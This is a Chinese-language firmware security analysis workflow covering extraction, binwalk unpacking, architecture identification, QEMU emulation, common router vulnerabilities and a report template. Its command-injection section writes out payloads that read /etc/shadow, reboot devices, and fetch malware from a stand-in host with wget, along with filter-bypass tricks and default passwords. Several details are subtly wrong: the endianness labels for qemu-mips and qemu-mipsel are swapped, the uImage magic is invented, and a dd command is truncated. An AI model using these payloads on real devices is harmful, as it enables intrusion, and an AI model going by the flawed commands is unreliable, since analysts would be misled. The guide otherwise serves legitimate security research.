# Firmware Analysis - 固件分析工作流

## 完整流程图

```
固件样本接收
    │
    ▼
┌─────────────┐
│  固件提取     │ ◄── 从设备/下载站获取原始固件
└──────┬───────┘
       │
       ├─→ 设备直接提取 (UART/JTAG/SPI Flash)
       ├─→ 厂商官网下载 (OTA更新/支持页面)
       ├─→ 社区镜像 (OpenWrt/DD-WRT等)
       └─→ 硬件Flash读取 (编程器)
       │
       ▼
┌─────────────┐
│  文件系统解包  │ ◄── 提取内部文件结构
└──────┬───────┘
       │
       ├─→ binwalk 自动识别 (签名/文件系统/压缩)
       ├─→ 手动偏移定位 (binwalk失败时)
       ├─→ 文件系统提取 (squashfs/jffs2/cramfs/ext4/yaffs2)
       └─→ 特殊格式处理 (ubifs/ubi/custom)
       │
       ▼
┌─────────────┐
│  架构识别     │ ◄── 确定CPU架构和端序
└──────┬───────┘
       │
       ├─→ CPU类型 (MIPS/ARM/PowerPC/ARC/x86)
       ├─→ 端序 (大端/小端)
       ├─→ 浮点模式 (硬浮点/软浮点)
       └─→ ABI (o32/n32/o64 for MIPS)
       │
       ▼
┌─────────────┐
│  目标程序分析  │ ◄── 分析关键二进制文件
└──────┬───────┘
       │
       ├─→ Web管理界面 (CGI/PHP/ASP)
       ├─→ 网络服务 (httpd/telnetd/sshd/upnpd)
       ├─→ 系统守护进程 (init/systemd/busybox)
       ├─→ 驱动模块 (.ko内核模块)
       └─→ 启动脚本 (init.d/rcS/preinit)
       │
       ▼
┌─────────────┐
│  漏洞发现     │ ◄── 寻找安全问题
└──────┬───────┘
       │
       ├─→ 硬编码凭证 (默认密码/API密钥)
       ├─→ 命令注入 (Web接口/ping/traceroute)
       ├─→ 认证绕过 (Cookie/Session/Header)
       ├─→ 信息泄露 (调试信息/版本号/源码)
       ├─→ 不安全更新机制 (无签名/明文HTTP)
       ├─→ 后门账号 (隐藏的telnet/SSH访问)
       └─→ 已知CVE (Nday漏洞)
       │
       ▼
┌─────────────┐
│  模拟/仿真     │ ◄── 在QEMU中运行分析
└──────┬───────┘
       │
       ├─→ 用户模式模拟 (qemu-mips/qemu-arm)
       ├─→ 系统模式模拟 (完整固件虚拟化)
       ├─→ FirmAE/Firmadyne (自动化框架)
       └─→ 模拟网络服务 (httpd/sshd)
       │
       ▼
┌─────────────┐
│  报告         │
└─────────────┘
```

---

## Phase 1: 固件获取

### 1.1 获取方法

| 方法 | 适用场景 | 工具 |
|------|----------|------|
| **厂商官网** | OTA更新、支持页面 | wget/curl, 浏览器 |
| **UART串口** | 有串口引脚的设备 | USB-TTL, screen/minicom |
| **JTAG** | 高级调试/提取 | JTAGulator, OpenOCD, Bus Pirate |
| **SPI Flash** | 直接读取Flash芯片 | CH341A programmer, flashrom |
| **U-Boot** | 有U-Boot引导的设备 | U-Boot tftpboot命令 |
| **TFTP** | 启动时通过TFTP获取 | Wireshark抓取, tftpd |

### 1.2 UART连接

```bash
# 常见串口参数
# 波特率: 115200 (最常见), 57600, 38400
# 数据位: 8
# 停止位: 1
# 校验: None

# Linux连接
screen /dev/ttyUSB0 115200

# Windows连接 (使用PuTTY或Tera Term)
# COM端口: 在设备管理器查看
# 波特率: 115200

# 中断启动进入U-Boot/Bootloader
# 上电后快速按回车/空格键
```

### 1.3 SPI Flash读取

```bash
# 使用flashrom和CH341A编程器
flashrom -p ch341a_spi -r firmware.bin -c "Flash芯片型号"

# 常见Flash芯片型号
# Winbond W25Q128FVSS (16MB)
# Macronix MX25L6406E (8MB)
# GigaDevice GD25Q127CSFI (16MB)

# 验证完整性
sha256sum firmware.bin
file firmware.bin
```

## Phase 2: 固件解包

### 2.1 binwalk自动提取

```bash
# 安装
pip3 install binwalk
binwalk --install-dependencies  # 安装提取依赖

# 扫描固件内容
binwalk -e firmware.bin        # 自动提取所有识别的内容
binwalk -Me firmware.bin       # 递归提取嵌套层

# 详细扫描 (不提取，只显示)
binwalk -A firmware.bin        # 签名扫描
binwalk -B firmware.bin        #熵分析
binwalk -Y firmware.bin        # Yara规则扫描
```

### 2.2 手动提取 (当binwalk失败时)

```bash
# 查找已知魔术字节
grep -boa '\x1f\x8b' firmware.bin   # gzip
grep -boa 'hsqs' firmware.bin        # squashfs
grep -boa '\x7fELF' firmware.bin     # ELF
grep -boa 'ZhaoChunRong' firmware.bin # uImage header

# 使用dd按偏移提取
if=firmware.bin of=extracted.bin bs=1 skip=<offset>

# 或用Python精确提取
python3 << 'EOF'
import struct

with open('firmware.bin', 'rb') as f:
    data = f.read()

# 搜索squashfs magic
magic = b'hsqs'
offset = data.find(magic)
while offset != -1:
    print(f"SquashFS found at offset {hex(offset)}")
    offset = data.find(magic, offset + 1)
EOF
```

### 2.3 常见文件系统提取

```bash
# SquashFS
unsquashfs -d extracted_root filesystem.squashfs

# Cramfs
cramfsck -x extracted_root filesystem.cramfs

# JFFS2
mkdir jffs2_mount
jffs2dump -l filesystem.jffs2  # 列出内容
modprobe mtdblock
modprobe jffs2
mount -t jffs2 -o loop ro filesystem.jffs2 jffs2_mount

# UBIFS/UBI
ubiattach /dev/ubi0 -m 0
ubimount /dev/ubi0_0 ubi_mount

# YAFFS2 (需要专用工具)
# https://code.google.com/archive/p/unyaffs/

# ext4
mkdir ext4_mount
mount -o loop,ro filesystem.ext4 ext4_mount
```

## Phase 3: 架构识别与二进制分析

### 3.1 架构确认

```bash
# 从ELF头读取架构信息
readelf -h ./busybox
readelf -h ./usr/sbin/httpd

# 关键字段:
# Class: ELF32 / ELF64
# Data: 2's complement, little endian / big endian
# Machine: MIPS / ARM / PowerPC / ...

# MIPS子架构检查
readelf -A ./busybox | grep -i "mips"
# ABI: O32 / N32 / N64
# FP: Hard float / Soft float
```

### 3.2 用户模式QEMU模拟

```bash
# 安装对应架构的qemu
sudo apt install qemu-user-static qemu-system-mips

# MIPS小端 (常见于路由器)
cp $(which qemu-mips-static) .
chroot . ./qemu-mips-static /bin/busybox ls

# MIPS大端
cp $(which qemu-mipsel-static) .  # 注意: mipsel = little endian
chroot . ./qemu-mipsel-static /bin/busybox ls

# ARM
cp $(which qemu-arm-static) .
chroot . ./qemu-arm-static /bin/busybox ls

# 带库路径运行
qemu-mips-static -L /path/to/sysroot ./target_binary arg1 arg2

# 追踪系统调用
qemu-mips-static -strace ./target_binary

# 调试模式
qemu-mips-static -g 1234 ./target_binary  # 监听1234端口
gdb-multiarch target_binary
(gdb) target remote :1234
```

### 3.3 Web接口分析

```
常见Web服务器:
  - httpd (BusyBox内置) — 最常见
  - mini_httpd
  - lighttpd
  - goahead
  - nginx

CGI脚本:
  - /cgi-bin/*.sh (Shell脚本) ← 最容易审计
  - /cgi-bin/*.asp (ASP)
  - /cgi-bin/*.lua (Lua)
  - PHP页面

重点检查:
  1. ping/traceroute CGI → 命令注入
  2. 登录认证 → 绕过/弱密码
  3. 文件上传 → 任意写入
  4. 配置导入 → 命令注入
  5. Diagnostics页面 → 信息泄露
```

### 3.4 启动脚本分析

```bash
# 关键启动脚本位置
/etc/init.d/rcS          # 主启动脚本
/etc/preinit             # 预初始化
/etc/config/network      # 网络配置
/etc/passwd /etc/shadow  # 用户凭据
/var/etc/config/*        # 运行时配置

# 查找硬编码密码
grep -r "admin\|password\|root" etc/
grep -rn "passwd\|crypt\|login" etc/init.d/

# 查找隐藏功能
grep -rn "telnet\|ssh\|dropbear\|backdoor" etc/
grep -rn "debug\|test\|hidden" etc/
```

## Phase 4: 常见固件漏洞

### 4.1 命令注入 (最常见!)

```
典型场景:
  - Ping诊断: host=127.0.0.1; reboot
  - Traceroute: target=; cat /etc/shadow
  - NSLookup: domain=$(cmd)
  - Diagnostics: cmd=; wget http://evil.com/malware

检测方法:
  1. 找到CGI处理函数
  2. 追踪用户输入到system()/popen()/execve()
  3. 检查是否有过滤
  4. 构造payload绕过过滤

常见绕过:
  - 空格替换: ${IFS}, $IFS, <, {cmd,arg}
  - 黑名单绕过: ; -> |, && -> &, $() 反引号
  - 编码绕过: URL编码, Base64, Hex
```

### 4.2 默认凭据

```
常见默认密码组合:
  admin/admin, admin/password, admin/1234
  root/root, root/admin, root/12345
  support/support, user/user
  空(空密码)

查找位置:
  - /etc/passwd, /etc/shadow
  - Web配置文件中的硬编码
  - 二进制中的字符串
  - 默认配置模板
```

### 4.3 已知Nday漏洞

```
常用搜索方式:
  - CVE数据库: cve.mitre.org
  - ExploitDB: exploit-db.com (搜索路由器型号)
  - 厂商公告
  - 安全研究者博客

常见影响范围大的漏洞:
  - D-Dir 多个RCE (CVE-2019...)
  - Netgear RCE (PSV-2018...)
  - TP-Link 多个漏洞
  - Realtek SDK "miniigd" RCE
  - Zyxel 命令注入
```

## Phase 5: 自动化工具

### FirmAE (推荐)

```bash
# 安装
git clone https://github.com/pr0v3rbs/FirmAE.git
cd FirmAE
./download.sh
./install.sh

# 运行分析
./run.sh -d firmware.bin firmware_test
./run.sh -a firmware_test

# 自动执行:
# - 固件解包
# - 架构识别
# - 内核提取
# - QEMU系统模拟
# - 网络服务启动
# - 漏洞扫描 (nmap + fuzzing)
```

### Firmadyne

```bash
git clone https://github.com/firmadyne/firmadyne.git
cd firmadyne
./download.sh

# 提取固件
./extractor/bin/extract.sh -i firmware.bin -d output_dir

# 分析并模拟
./scripts/tar2db.py output_dir/<image_id>.tar.gz
./scripts/makeImage.sh <image_id>
./scripts/run.sh <image_id>
./scripts/inferNetwork.sh <image_id>
./scripts/boot.sh <image_id>
```

## 报告模板

```markdown
# 固件安全分析报告: [设备名称/型号]

## 设备信息
- 型号: ...
- 制造商: ...
- 固件版本: ...
- 获取日期: ...
- SHA-256: ...

## 固件结构
| 偏移 | 大小 | 类型 | 描述 |
|------|------|------|------|
| 0x00000000 | 0x20000 | U-Boot | Bootloader |
| 0x00020000 | 0xF00000 | SquashFS | Root文件系统 |
| 0x00F20000 | 0x80000 | JFFS2 | 配置存储 |

## 发现汇总
| # | 严重程度 | 类型 | 组件 | CVSS |
|---|----------|------|------|------|
| 1 | Critical | 命令注入 | ping.cgi | 9.8 |
| 2 | High | 默认凭据 | Web登录 | 8.0 |

## 详细发现
...

## 建议
...
```